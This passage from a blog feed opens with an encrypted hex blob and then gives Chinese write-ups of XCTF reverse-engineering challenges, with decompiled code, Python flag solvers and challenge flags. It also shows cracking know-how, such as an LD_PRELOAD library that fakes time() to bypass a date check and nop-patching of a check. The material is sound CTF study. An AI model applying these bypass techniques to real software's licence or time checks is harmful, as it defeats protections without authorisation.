1e397347f8f7bda8e32d2e2d1e441cfde168d44b065d259270d17bab0b9ccd12f6e50ae534e16050bbbe90f33ae125107ad77f6254ab3dfa9df993e156a9454246a177fb4f2ce61b5afe23fc6d0ecf8da094cfa4709a51272b703904f4fef2df93416e24a350e86a0e7592ed3d05bfc5839c0c1a540e928482d47c9da7983bad2b3d0a1d3d9d30c50ddadd974e6d2e8e5056b9a1b15e8578d84719eabe9f31e8eafb9ede0b92fe728ed1615e7849d252cdceb54b6b81fd859088a4f7521285fba781791a19754060de7dd030e2bab45b217ed033efb0a0d6c088d1daacdb60df41d2761b197e83ecf355ba248d716e072ebb21bfb185e62c3ba6c641e50373b2ca553708a9b26807500fb7aee4a301faf423fbe4564a36da4f83e7e2f61a6900b91a0dabac84a5419ba6d68a54ba3153dbb618e477dbfe9188ceaa8c4c586e65655796ba616c5124903937eb4923e2f1808277e36c370880f813efc1cbcb2a9b046780e21dd572c6d7c1f3d76bc7a65c62393c62d6c074e078498cb5844bdae9df9eb77ffa335cf8cd9a74eddf5be756ad823b482c2161daee38351a45716a6c7945c5504645dd3e36840b4e251394c4ec83886832ae10cebc453d2062d32ae5a555c00026775d21b2a85e19e99fb9f49a32e868f8d73502d96887f5666553c0a3e7c29de2f88a7bf31e90927cc5876cfc645cd07758a643c4916a66ecd007a82090b4ddffd6026e3be4370ac564f572438be0f675b4c6caebaed1f0914b295a29f72f32b79a1b76a2ce21ea57d22263079ef197f2db57fcf49e15afdc386248d57ed22859a2e05adae8fc46645441cb4cd26a40f8935c63e153b12b166da03bc4219fad6fe796a72d43c7d27c6f967b6b0a4588c3ea44d66d62481ae735ea18cb68ac544690eb601adb9ced024275aa018a5635abde8452509859b6ff25f8d929b5673dbb2af95ba37bd8b5aa8eff8020ff49d7ea0f6dd360bf6c4334286c157799d27617415de13b82512e25b7fac5baa51ec6858056b9e316047dcd918821992640d94d0ffe8179bd51cf2a22cd6498c0a6749eed0d57165133837609e225aedbfb213ff52362f0e5b4d31764d9c1ccd3daba4d9261a56e8e4506b2c6214c974bd2ac8f5c868051a170146188afec1658c2e2975e59cb71eeca6f56153ff2561a031cc8446d6ce3b88f51687755e1987ae87855bfe0109ac53140de8653022822b518101c181cec753796152011b3f2e5dc875f20038407b73fc719327a735310ed256dd4eec5bbb572e9bd10b71ba95c4c6a0f88621795389f05fbd65cc44fddf275fa1bf1f9a380f866fced5805d48d4976dced17e311702c19e36e89f4f4e163d95fd140a5747ef9eef4f21bc64b2860fd8781eed0a3674e17ada6258ce103f9399d1288ad36cae7da7c974002811f280763602ec88d4c47c08ebc1b57fe63a0ca3a10e450931227d3654a798ff92c533ea38d2c58bd3c5648949514c8402cfbe941f793670855aa775f74be164eb867ee11aa5b9b4bc3ea42053cc08f56b77a26a4a5c46bc33038ea9f09c77b767c81ae01e45566aedf523a9576641d5c3ad545402c05aa2d76c1f991494e9f742e4d4d1a8b11c3f0ffa45b5aa4ab43f9a30c5bb906d112f1c68fa40cfce8b15c541f7c9aca5a553ce8d185fcf1c616c58a4ab9cadedab4a8640a7c76ea79b686923b115be849531cd9e578149a13dbfb4d17e9cbe081bf422c395c9e954b7d95b05f7fb0ae7efa353b3ec0d09acfc527e602c1d6c66d092f911ede2732a48ec91e54c66e7bc558d6322743d2c186cf1292d6a582d7e4027908df8985ad111dce62657a7e04f15d763dd0c04cd3bb1580bc8ae359ca2df782a7d97f72dfd62af10f3fe28bd41c3900686d16cbc91a25add6ed45999fd86aa5b410ae59acb8860e87e50017ccd4f85ce3ec74d43ffdb0f8ad4384e63c1e6e80fdd044f4ea64071705729a286f58e58df46689e7088308fe2410dacd35cd9cedcbbeb074e352b51e302a78bbf4f0ef074fd80cc6962acb6237f9308718a6cd7b646c0e903b9374b0762036459edc9c768a500d1c5975e6ae0f814bcdc659ef35b782169799b4c7b81e6543876a78fa89c9b46e80c3d77a37fc2d78bb5755fc343579016600cb92c7bacdece24fe94df74a0f066549ef025832812e9bd6cbebf22da82d79a118b4076ca6bda17d8573e5e297131527b50e57e27180c1105d29d01f0f6eec692ae2fa57e217ac66b2d03c242014afb5b45fb95aa599eebc75d49cb6c4786774481059917c0a579247ddca1d25f42ca033a3945490344f7d859a87299fb5adfb7967c5703558bff6214358d95b5bdfe685610ba12de95a6ed47cb92c9ebcbd2b9d778b141fa213456937b23295eef4b64cc6061d79f9b4cea134f2830cc59ba089e5a62c753970a7098cf65bec97b399e0bae922a67c06df4508bc5bb60360e10608f790ec8188db618500bae80d2bd0874918c69ca853ad3fa3ee1f6fba17b2fdd67fefb4b91f3b2018fbcb6913afa41880118cf1190a37e72316e706cc92ec44ee1b19c63da5a9900a6adbf9af728d2aeb3eebf152114dc0e12bd83646e199f4e5aa14b58a66a95ddb875db1dfadd7cc32ec62b40fb3671498fea6cd4fe8a648fb8e77a9af87daefe85329f5c1278c40a91e01d919267866b5c5f9d6ba467aa6d6cfe9798a6788aeb4ed1b41117b05c43ca268b4e9e2579398f224b4a097cc360acdd6cbcba6d9796efd39e88e7e6b40ef941142f6a105855f0306aa2ba13bcb15a1ef1edb70f1cc638726897517a15150cbbf7df91c3d0b10f8dfefa3568e69824555803f4a023e1ba36aac0fcd6520ec72db15813f580d6447e41534013459692232d0e13663392895d6a6bdc24063f7de8ef181d89fc56a66f671ff543903fddd1d0a4e7ddde0290fd1eaf9e111ce768f4db1178b9cdaa29c19e89868ea168a353c7659673c692fa17f3f196506dba00f4e0ed9a9a5b1dfcb4e4156da0e586edf122fb977f22ec740181f59c7d265068b4b84667e70780e67e0d10bb4b697b228e648ccc4fa4dddb0a2be6775544b0c249c1cbd68889fc46937e6596cb8735263331b7e165cbabc97b92248a63c3edf5a8422f583782dc7506a5517400f4790b02e738436eba9f819776f8c707c246358a190251ac3bc8ce0f7d5fe06ca56baf36278d9cf84f63d24b5f809cd181a3b6a28ab7dfeadbe1ddadfa59ae0bbdd7a146783283461e167d882dd5e4e2521da6cebdd7a2c5e5661ee57e9261d11fb412ee9cbb1389999043f39b5884edc55f9a713aa4d89c3aa645d49ff3f9d82ae5922ab555f4471c6747103bf0b69d14b3d749ccb217ee6d07a5e16d116add94069fe2f10ec737e954656afcbe7da5b83fcbb983a06ef83a43dd5e791ee35f61b50d2f510f2e4fa2ffbeff7303815aca5edb8ae204626e9005bea0b8fc59dad3feb540bdf0ead4d76c73028d70f7745dbb7b66d906471cb44f5823f87549929fdcae59afe7779cf30f64ca77127d1199596522a3486e65659a34e1e5895dabba48bc10e1aa3da192b84f1a43cde99ef139e8aba21d44d1f357a26a96cf123789a2d246d226dc154df8406b319fff4cc7f6a035890b817529fbd1c6e224d2e3c7aa4a4ec9ee3b19313dbca9a88eceacbf8149c2e38e8d489f855ef6aedc38dc6358836955893fcc1cc4e13e6756c6319df0384635689f204771a77b07fbd016916a1090cd8bf3978371f6ccd0a8a121b2b9260006fa5f2ccc5c826b9ede385c5012e05426b23985eb710647b91f3db1efe65ccab1b1725787e5bd9bc9007ef390dd93d16ff21ccfc787f8295b8b8fd69d9829aed34a8e5bd7542ec83bed5b56d197b9fbb8a8ff03e5f052ca749daf2b43e2b6ad44c8b77675e2d273f7b188fbd28f19a8cf7ef3872397527d838cae909ac1833c737b4caa27df031264a7a578897ff0f82f1f6c4b2e087851b29f033de0318a5338224f9d29bbc86cd143d510d678e14ee032ddeb2bf3ff26b497696cca738c920859e6e292ef3274526cef02fc767f50dd1bff1d1ae41beff0548b8846aee446b6cb6b50d8d00c97407410fb3cd56a7165d8c3ae8902e8d422820ad073af3e2742b6d687a7cfdfd560b267bdc590f5f109a5db05f83ab657b7e899402d25f30e88c27d3edad0c0cc5160f0d499ad1b70c27fccd4bde772f049e4d591f25162e9dc820ad65592dec74e3dfe79a2ee09d8d87c5d20d5516f0e3bbf135ca5567aec832f4aeb0dd53e72f339524b3c76df70e3d2e8bbb77fa0dc05bb30698de312d585638a57234385f92f1cf5fadec561dabe3abfe454b45b5a905ab9760ddf43ba7a5066639686a803f820be5fedd077e7d9329a039e6d0c09ba271851f467074f0753bea8851a5fbd9819add76d6a79bec2aa7ccad3a1592d3ef77c408c571853e122a8a95b1087487c3eaae5bf4edce0162280591f8d7d5e634f9c2b1c2ca4474868e963dcbd01b204a05d64bad4385fab7e5ec77c65ac5c7839381d9db6fa0375c0883605487723a456f381d8d156624444e87d91dd2150c4c6ea0cb874f54c37050fc682f278f33589406825608260a33ade975413b7536172a484f2f4fc20c156193e1cdb42ef48a55ab888c3fa31f71477ed8a5e495c152cd09c7b99e3892c7d7c5b333903329d90cfb537b42f5f0e170542215c4fa6fdcfa19b58c777fdb073e3f240fc057fb351daa511b5ba312bca0b54ddb0a423406baa6100db64672764c382353a045b8162ec5f13d810242c20186cd691c4e0594e8f813cf8d32f588e6e14f4771dcad39902860bc1ad4894fca5ebdf5d2dd19ff9f4dc2aa92f859a86f227da93f522b3ebceb5978bec4bb60065b04d1f72eb80fb7e6b0cca3fe123597d2d19f0908a0ca2aef2c1295d5c6606995f8cae122da0e1ab62c048202ff8d8284b233e17bb87e5f7ba9eae4b1efd13f7fc31f8510c2ecdf5f23d94a3a1841f372c3c4524159092ec12601c06745d06612ff164460ee320eacca0eb236c9956f37ddb733e13b9bdb5cddbd3c8f31caea704190b815a1d6743720c5f7aa52cc5abf21d9741168631dd3577c4979d5fc12935c1da76af7a53ddbceef3e6a367dfab8f59dc1a8d845f8071227ca54fd5a36f26aa50796b2026aea5c773e1e9d4e4e3fb8e54c40643a63b7cf902010008d38052759bacd765afe972624eec1ab125c4586a427064896b6d1b1545863bbd4b122b2dd557dc281e72b4cd45922b00cec6e3fc2e082bf0e1f3723ead780b52fc270a7faec551818f98872fd6496f5774cb629a0ded1e5430128dcf9bec49968e7dd95fd7ec0cd6079eb38bb10ca96c047d69a86bae2c1692d76a9df232a241c66bdcc98c2fdbc01bdddbdf92581f7f9fde7d6bfdd9a54df1585f6ab454434678fac447224b0391ef2d04641147e9400ddb3a548de7fd9eac83ec26e79fbce0949ad8f3215389e7edf2c6f78269572d1fe1674f8378f9409f0a78147322c</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基础</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界高手区re</title>
    <url>/posts/c8f4b23e/</url>
    <content><![CDATA[<h1 id="高手区re"><a href="#高手区re" class="headerlink" title="高手区re"></a>高手区re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>gdb调试拿到flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/s <span class="variable">$esp</span>+0x24</span><br><span class="line">0xffffd174:	<span class="string">"SECCON&#123;Welcome to the SECCON 2014 CTF!&#125;"</span></span><br></pre></td></tr></table></figure><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MD5 *__fastcall MD5::init(MD5 *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  MD5 *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *<span class="keyword">this</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">this</span> + <span class="number">17</span>) = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">this</span> + <span class="number">18</span>) = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">this</span> + <span class="number">19</span>) = <span class="number">0x67452301</span>;</span><br><span class="line">  *(<span class="keyword">this</span> + <span class="number">20</span>) = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">  *(<span class="keyword">this</span> + <span class="number">21</span>) = <span class="number">0x98BADCFE</span>;</span><br><span class="line">  result = <span class="keyword">this</span>;</span><br><span class="line">  *(<span class="keyword">this</span> + <span class="number">22</span>) = <span class="number">0x10325476</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>md5的4个常数，没改，所以百度搜下md5解密，解780438d5b6e29db0898bc4f0225935c0<br>解出来就是这个<br>hash: b781cbb29054db12f88f08c6e161c199</p><h2 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h2><p>dump出数据跑一下就好</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List1 = [<span class="number">0x00000024</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000036</span>, <span class="number">0x00000065</span>, <span class="number">0x00000007</span>, <span class="number">0x00000027</span>, <span class="number">0x00000026</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000056</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000065</span>, <span class="number">0x00000003</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000016</span>, <span class="number">0x00000002</span>, <span class="number">0x00000015</span>, <span class="number">0x00000003</span>, <span class="number">0x00000065</span>, <span class="number">0x00000000</span>, <span class="number">0x00000029</span>, <span class="number">0x00000044</span>, <span class="number">0x00000044</span>, <span class="number">0x00000001</span>, <span class="number">0x00000044</span>, <span class="number">0x0000002B</span>]</span><br><span class="line">string = <span class="string">"L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_&#123;FL4G&#125;_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t"</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">    flag += string[List1[i]]</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="comment">#ALEXCTF&#123;W3_L0v3_C_W1th_CL45535&#125;</span></span><br></pre></td></tr></table></figure><h2 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h2><p>北斗壳，用nspack脱掉</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List =[<span class="number">0x00000012</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000014</span>, <span class="number">0x00000024</span>, <span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x0000003D</span>, <span class="number">0x00000056</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000067</span>, <span class="number">0x00000000</span>, <span class="number">0x00000041</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000046</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000044</span>, <span class="number">0x00000042</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000044</span>, <span class="number">0x00000072</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000040</span>, <span class="number">0x0000003E</span>, <span class="number">0x0000004B</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x0000004C</span>, <span class="number">0x0000005E</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000017</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000016</span>, <span class="number">0x00000068</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000012</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>]</span><br><span class="line">string = <span class="string">"this_is_not_flag"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(List)):</span><br><span class="line">    first = ord(string[i%<span class="number">16</span>])</span><br><span class="line">    second = chr( first ^ List[i] )</span><br><span class="line">    flag += second</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="comment">#flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span></span><br></pre></td></tr></table></figure><h2 id="re5"><a href="#re5" class="headerlink" title="re5"></a>re5</h2><p>强，mips的题目</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">string = <span class="string">"cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">    first = ord(i)^<span class="number">55</span></span><br><span class="line">    flag += chr(first)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 retdec-decompiler.py ~/Downloads/比赛/xctf/逆向进阶/<span class="number">5</span></span><br></pre></td></tr></table></figure><p>利用retdec获得c代码，成功</p><p>ghidra也可以反编译mips好强<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117115746.png" alt></p><h2 id="re6"><a href="#re6" class="headerlink" title="re6"></a>re6</h2><p>c++的，读懂流程后写代码<br>坑点。。。要逆序<br>还是小端序问题</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">string1 = <span class="string">'htadimehtadimeht'</span>[::<span class="number">-1</span>] + <span class="string">"dime"</span>[::<span class="number">-1</span>] + <span class="string">'a'</span></span><br><span class="line">string2 = <span class="string">'&lt;&lt;&lt;....++++----&gt;'</span>[::<span class="number">-1</span>] + <span class="string">'.&lt;'</span>[::<span class="number">-1</span>]</span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string2)):</span><br><span class="line">    result = (ord(string1[i]) ^ ord(string2[i]))+<span class="number">22</span></span><br><span class="line">    key += chr(result)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    flag += chr(ord(i)+<span class="number">9</span>)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><h2 id="re7"><a href="#re7" class="headerlink" title="re7"></a>re7</h2><p>第一个idapython脚本取了数据，具体在另一篇博客里</p><p>可以看出这个前面的检查跟后面的没关系，可以nop掉或者直接gdb调试拿flag都可以<br>这不是我想要的，我还是想学算法。。<br>flag_is_you_know_cracking!!!</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List = [<span class="number">84</span>, <span class="number">200</span>, <span class="number">126</span>, <span class="number">227</span>, <span class="number">100</span>, <span class="number">199</span>, <span class="number">22</span>, <span class="number">154</span>, <span class="number">205</span>, <span class="number">17</span>, <span class="number">101</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">227</span>, <span class="number">211</span>, <span class="number">67</span>, <span class="number">146</span>, <span class="number">169</span>, <span class="number">157</span>, <span class="number">210</span>, <span class="number">230</span>, <span class="number">109</span>, <span class="number">44</span>, <span class="number">211</span>, <span class="number">182</span>, <span class="number">189</span>, <span class="number">254</span>, <span class="number">106</span>]</span><br><span class="line">flag_data = [<span class="number">0xDC</span>, <span class="number">0x17</span>, <span class="number">0xBF</span>, <span class="number">0x5B</span>, <span class="number">0xD4</span>, <span class="number">0x0A</span>, <span class="number">0xD2</span>, <span class="number">0x1B</span>, <span class="number">0x7D</span>, <span class="number">0xDA</span>, <span class="number">0xA7</span>, <span class="number">0x95</span>, <span class="number">0xB5</span>, <span class="number">0x32</span>, <span class="number">0x10</span>, <span class="number">0xF6</span>, <span class="number">0x1C</span>, <span class="number">0x65</span>, <span class="number">0x53</span>, <span class="number">0x53</span>, <span class="number">0x67</span>, <span class="number">0xBA</span>, <span class="number">0xEA</span>, <span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x22</span>, <span class="number">0x72</span>, <span class="number">0xD3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">List1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(List), <span class="number">4</span>):</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    result += hex(List[i+<span class="number">3</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>)+ hex(List[i+<span class="number">2</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>) + hex(List[i+<span class="number">1</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>) + hex(List[i])[<span class="number">2</span>:].zfill(<span class="number">2</span>) </span><br><span class="line">    List1.append(int(result, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">List2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(List), <span class="number">4</span>):</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    result += hex(flag_data[i+<span class="number">3</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>) + hex(flag_data[i+<span class="number">2</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>) + hex(flag_data[i+<span class="number">1</span>])[<span class="number">2</span>:].zfill(<span class="number">2</span>) + hex(flag_data[i])[<span class="number">2</span>:].zfill(<span class="number">2</span>) </span><br><span class="line">    print(result, )</span><br><span class="line">    List2.append(int(result, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print([hex(i) <span class="keyword">for</span> i <span class="keyword">in</span> List1])</span><br><span class="line">print([hex(i) <span class="keyword">for</span> i <span class="keyword">in</span> List2])</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    v3 = List1[i]^<span class="number">0xDEADBEEF</span> </span><br><span class="line">    print(hex(v3))</span><br><span class="line">    temp = hex(v3)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    v3 = [ int(temp[<span class="number">6</span>:<span class="number">8</span>], <span class="number">16</span>), int(temp[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>), int(temp[<span class="number">2</span>:<span class="number">4</span>], <span class="number">16</span>), int(temp[:<span class="number">2</span>], <span class="number">16</span>) ]</span><br><span class="line">    temp = hex(List2[i])[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">    v4 = [ int(temp[<span class="number">6</span>:<span class="number">8</span>], <span class="number">16</span>), int(temp[<span class="number">4</span>:<span class="number">6</span>], <span class="number">16</span>), int(temp[<span class="number">2</span>:<span class="number">4</span>], <span class="number">16</span>), int(temp[:<span class="number">2</span>], <span class="number">16</span>) ]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        print(hex(v3[j]), hex(v4[j]))</span><br><span class="line">        result = v3[j] ^ v4[j]</span><br><span class="line">        flag += chr(result)</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure><p>好简单的题目，可是光是数据转换以及小端逆序就搞了我好久。。。</p><h2 id="re8"><a href="#re8" class="headerlink" title="re8"></a>re8</h2><p>confuse里干了这些事<br>第三部分 转1<br>第四部分 转2<br>第一部分 转3<br>第二部分 转4<br>简单，将结果转换回去就好了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>string = <span class="string">'daf29f59034938ae4efd53fc275d81053ed5be8c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string[<span class="number">40</span>:]</span><br><span class="line"><span class="string">''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string[<span class="number">31</span>:]</span><br><span class="line"><span class="string">'53ed5be8c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string[<span class="number">30</span>:]</span><br><span class="line"><span class="string">'053ed5be8c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'&#123;'</span> + string[<span class="number">20</span>:<span class="number">30</span>] + string[<span class="number">30</span>:] + string[:<span class="number">10</span>] + string[<span class="number">10</span>:<span class="number">20</span>] + <span class="string">'&#125;'</span></span><br><span class="line"><span class="string">'&#123;53fc275d81053ed5be8cdaf29f59034938ae4efd&#125;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(<span class="string">'53fc275d81053ed5be8cdaf29f59034938ae4efd'</span>)</span><br><span class="line"><span class="number">40</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>有坑，不用带{}交flag</p><h2 id="re9"><a href="#re9" class="headerlink" title="re9"></a>re9</h2><p>原来不知道这题要干嘛，看出有base64跟md5<br>后面就不知道了</p><p>emm，这道题又学到新知识了,利用环境变量伪造时间，绕过检测</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">time</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> atoi(getenv(<span class="string">"CURR_TIME"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成动态链接库</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -c -fPIC -o faketime.o faketime.c</span><br><span class="line">gcc -shared -o faketime.so faketime.o</span><br></pre></td></tr></table></figure><p>获得时间戳</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>time_now = time.mktime(time.strptime(<span class="string">'2012-12-21'</span>, <span class="string">'%Y-%m-%d'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>time_now</span><br><span class="line"><span class="number">1356019200.0</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#CURR_TIME=1325347200</span></span><br><span class="line">CURR_TIME=1356019200</span><br><span class="line">LAST_TIME=1356969600</span><br><span class="line">hour=3600</span><br><span class="line"><span class="built_in">export</span> CURR_TIME</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$CURR_TIME</span> -lt <span class="variable">$LAST_TIME</span> ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    value=$(CURR_TIME=<span class="variable">$CURR_TIME</span> LD_PRELOAD=$(<span class="built_in">pwd</span>)/faketime.so ./launcher)</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"<span class="variable">$value</span>"</span> != <span class="string">""</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$value</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        CURR_TIME=$[CURR_TIME+hour]</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>emm在具体分析的话，前面可以看出是%Y-%m-%d将时间戳md5加密，再加上.fluxfingers.net，</p><p>v21 = sub_18A4(dest);<br>if ( !v21 )<br>return 1LL;</p><p>这里是关键函数，截取返回值，动态获得</p><p>在base64解密一次，</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117101242.png" alt></p><p>最后异或0x25</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117101400.png" alt></p><p>就是flag了<br>flag{e3a03c6f3fe91b40eaa8e71b41f0db12}<br>最主要关键点要联想到世界末日时间</p><h2 id="re10"><a href="#re10" class="headerlink" title="re10"></a>re10</h2><p>…手动计算下就出来了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(v11) != <span class="number">16</span></span><br><span class="line">  || v11[<span class="number">0</span>] != <span class="string">'C'</span></span><br><span class="line">  || v11[<span class="number">15</span>] != <span class="string">'X'</span></span><br><span class="line">  || v11[<span class="number">1</span>] != <span class="string">'Z'</span></span><br><span class="line">  || v11[<span class="number">1</span>] + v11[<span class="number">14</span>] != <span class="number">155</span></span><br><span class="line">  || v11[<span class="number">2</span>] != <span class="string">'9'</span></span><br><span class="line">  || v11[<span class="number">2</span>] + v11[<span class="number">13</span>] != <span class="number">155</span></span><br><span class="line">  || v11[<span class="number">3</span>] != <span class="string">'d'</span></span><br><span class="line">  || v11[<span class="number">12</span>] != <span class="string">'7'</span></span><br><span class="line">  || v11[<span class="number">4</span>] != <span class="string">'m'</span></span><br><span class="line">  || v11[<span class="number">11</span>] != <span class="string">'G'</span></span><br><span class="line">  || v11[<span class="number">5</span>] != <span class="string">'q'</span></span><br><span class="line">  || v11[<span class="number">5</span>] + v11[<span class="number">10</span>] != <span class="number">170</span></span><br><span class="line">  || v11[<span class="number">6</span>] != <span class="string">'4'</span></span><br><span class="line">  || v11[<span class="number">9</span>] != <span class="string">'g'</span></span><br><span class="line">  || v11[<span class="number">7</span>] != <span class="string">'c'</span></span><br><span class="line">  || v11[<span class="number">8</span>] != <span class="string">'8'</span> )</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span 